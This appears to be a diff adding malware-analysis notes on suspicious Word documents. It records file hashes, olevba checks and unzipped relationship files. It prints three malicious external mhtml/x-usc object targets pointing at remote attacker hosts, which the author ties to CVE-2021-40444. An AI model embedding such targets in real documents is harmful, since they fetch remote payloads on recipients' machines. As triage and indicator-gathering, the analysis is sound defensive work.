@@ -5,3 +5,82 @@ file Employees_Contact_Audit_Oct_2021.docx
 file Work_From_Home_Survey.doc
 file Income_tax_and_benefit_return_2021.docx 
 
+file Work_From_Home_Survey.doc
+This file is different — it used the older binary .doc format, not zipped like .docx. 
+So I used hashing and online reputation scanning with VirusTotal, docguard,tria.ge.
+
+md5sum Work_From_Home_Survey.doc
+    41dacae2a33ee717abcc8011b705f2cb
+sha256sum Work_From_Home_Survey.doc
+    84674acffba5101c8ac518019a9afe2a78a675ef3525a44dceddeed8a0092c69
+file Work_From_Home_Survey.doc
+    DOCX
+
+
+file Employee_W2_Form.docx
+file Employees_Contact_Audit_Oct_2021.docx
+file Income_tax_and_benefit_return_2021.docx 
+
+Since .docx is actually a zipped XML-based archive, my next step is to extract the contents and manually inspect it.
+
+file Employee_W2_Form.docx
+MD5
+45e7d6562bfddb816d45649dd667abde
+SHA-1
+00087e46ec0ef6225de59868fd016bd9dd77fa3c
+SHA-256
+679bbe0c50754853978a3a583505ebb99bce720cf26a6aaf8be06cd879701ff1 
+file
+    DOCX
+
+olevba Employee_W2_Form.docx
+# → No macros found
+
+unzip Employee_W2_Form.docx -d extracted_docx2
+cd extracted_docx2/word/_rels
+cat document.xml.rels
+result
+Target="mhtml:arsenal.30cm.tw:1212/word.html!x-usc:arsenal.30cm.tw:1212/word.html"
+The presence of a non-standard port 1212 stood out — likely used by an attacker-controlled server.
+
+
+file Employees_Contact_Audit_Oct_2021.docx
+MD5
+d5742309ba8146be9eab4396fde77e4e
+SHA-1
+8aaa79ee4a81d02e1023a03aee62a47162a9ff04
+SHA-256
+ed2b9e22aef3e545814519151528b2d11a5e73d1b2119c067e672b653ab6855a 
+file
+    DOCX
+
+olevba Employees_Contact_Audit_Oct_2021.docx
+# → No macros found
+
+unzip Employees_Contact_Audit_Oct_2021.docx -d extracted_docx1
+cd extracted_docx1/word/_rels
+cat document.xml.rels
+result 
+<Relationship ... Target="mhtml:http://175.24.190.249/note.html!x-usc:http://175.24.190.249/note.html" TargetMode="External"/>
+IOC Found: External OLE object contacting http://175.24.190.249/note.html
+This link pointed to a remote HTML payload, suggesting it leveraged CVE-2021–40444.
+
+
+file Income_tax_and_benefit_return_2021.docx 
+MD5
+55998cb43459159a5ed4511f00ff3fc8
+SHA-1
+9bec2182cc5b41fe8783bb7ab6e577bac5c19f04
+SHA-256
+d0e1f97dbe2d0af9342e64d460527b088d85f96d38b1d1d4aa610c0987dca745 
+file
+    DOCX
+
+olevba income_tax_and_benefit_return_2021.docx
+# → No macros found
+
+unzip income_tax_and_benefit_return_2021.docx -d extracted_docx3
+cd extracted_docx3/word/_rels
+cat document.xml.rels
+result
+Target="mhtml:http://hidusi.com/e8c76295a5f9acb7/side.html!x-usc:http://hidusi.com/e8c76295a5f9acb7/side.html"
